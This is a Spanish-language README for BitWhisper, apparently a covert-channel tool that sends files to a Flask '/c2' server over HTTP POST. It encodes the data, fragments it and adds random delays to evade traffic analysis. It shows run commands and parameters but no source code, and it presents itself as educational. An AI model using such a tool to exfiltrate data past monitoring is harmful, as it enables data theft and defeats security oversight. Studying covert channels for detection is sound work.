# 🕵️‍♂️ BitWhisper V2.0

**BitWhisper** es un proyecto que demuestra el uso de un canal encubierto a través de peticiones HTTP POST con tamaños de payload variables para transmitir datos de forma sigilosa entre un cliente y un servidor.

Las técnicas de canal encubierto se utilizan comúnmente en el ámbito de la ciberseguridad ofensiva para evadir medidas de control de análisis de tráfico.

## 🔐 ¿Para qué sirve?

Este proyecto puede utilizarse para:

- Demostrar técnicas de evasión y canales encubiertos.
- Investigar mecanismos de detección de tráfico anómalo.
- Aprender sobre codificación binaria y manipulación de tráfico HTTP.

## 🧠 ¿Qué es BitWhisper?

BitWhisper es una herramienta experimental para la transmisión encubierta de archivos a través de peticiones HTTP POST fragmentadas y codificadas. Permite transformar el contenido de un archivo en distintos formatos y enviarlo a un servidor que reconstruye los datos y los almacena localmente.

## 🧩 Características

- Transmisión de archivos.
- Múltiples métodos de codificación para ofuscación de datos:
  - `ByteToBits`
  - `ByteToBase64`
  - `ByteToBitToPayloadSize`
  - `ByteToXor`
- Fragmentación configurable.
- Cálculo de entropía antes y después de codificar.
- Envío con retardo aleatorio opcional para evasión de detección.
- Control de tasa de transferencia y métricas.
- Verificación de integridad mediante hash SHA-256.

## 📁 Estructura

```bash
.
├── cliente.py       # Cliente transmisor del archivo
├── servidor.py      # Servidor receptor y decodificador
├── output/          # Carpeta donde se almacenan los archivos reconstruidos
└── README.md        # Este archivo
```

## 🛠 Requisitos

    Python 3.6+
    Paquetes:
        requests
        flask
        

## 🚀 Cómo ejecutar

### 1. Inicia el servidor receptor

```bash
python3 servidor.py
```

Esto abrirá un servidor Flask en el puerto 5000 esperando peticiones HTTP POST en el endpoint /c2.

### 2. Ejecuta el cliente encargado de transmitir el fichero

```bash
python3 cliente.py \
  --pathFile archivo_a_enviar.txt \
  --url http://127.0.0.1:5000/c2 \
  --blockSize 15000 \
  --encodingMethod ByteToBits
```

### Parámetros

| Parámetro         | Descripción                                                              |
|------------------|---------------------------------------------------------------------------|
| `--pathFile`      | Ruta al archivo a enviar.                                                 |
| `--url`           | URL del servidor receptor.                                                |
| `--blockSize`     | Tamaño de cada bloque de datos a enviar.                                 |
| `--encodingMethod`| Método de codificación.                                                  |
| `--key`           | Clave para el método `ByteToXor`. Opcional pero obligatorio en ese caso. |
| `--delay`         | Si se incluye, introduce retardo aleatorio entre paquetes.               |

## 🧠 Métodos de Codificación

| Método                 | Descripción                                              |
|------------------------|----------------------------------------------------------|
| `ByteToBits`           | Cada byte es convertido a una cadena de 8 bits.         |
| `ByteToBase64`         | Cada byte es codificado a Base64.                        |
| `ByteToBitToPayloadSize` | Representación de bits usando el tamaño del contenido (`'a' * 1` o `2`). |
| `ByteToXor`            | Codificación XOR con una clave proporcionada.            |

El servidor decodifica automáticamente el método inverso de forma dinámica.

## 🔐 Integridad

Se utiliza un hash SHA-256 del contenido original para asegurar que los datos no fueron alterados durante la transmisión.

## 📊 Métricas mostradas

    Entropía antes y después de codificar
    Aumento del tamaño del archivo tras codificación
    Número de paquetes enviados y por enviar
    Tasa de transferencia
    Tiempo estimado restante

## ⚠️ Advertencia

**Este proyecto es solo para fines educativos y de investigación.**

Está diseñado para ayudar a comprender cómo funcionan los canales encubiertos y las técnicas de transmisión de mensajes encubiertos a través de protocolo de comunicación de capa 7. No debe utilizarse para actividades ilegales, maliciosas o no autorizadas.

El uso indebido de este código para exfiltración de datos o evasión de sistemas de seguridad puede quebrantar las regulaciones locales, nacionales o internacionales, así como las políticas corporativas.

Al usar este proyecto, asumes toda la responsabilidad y te comprometes a respetar la ética y las normativas vigentes.

---
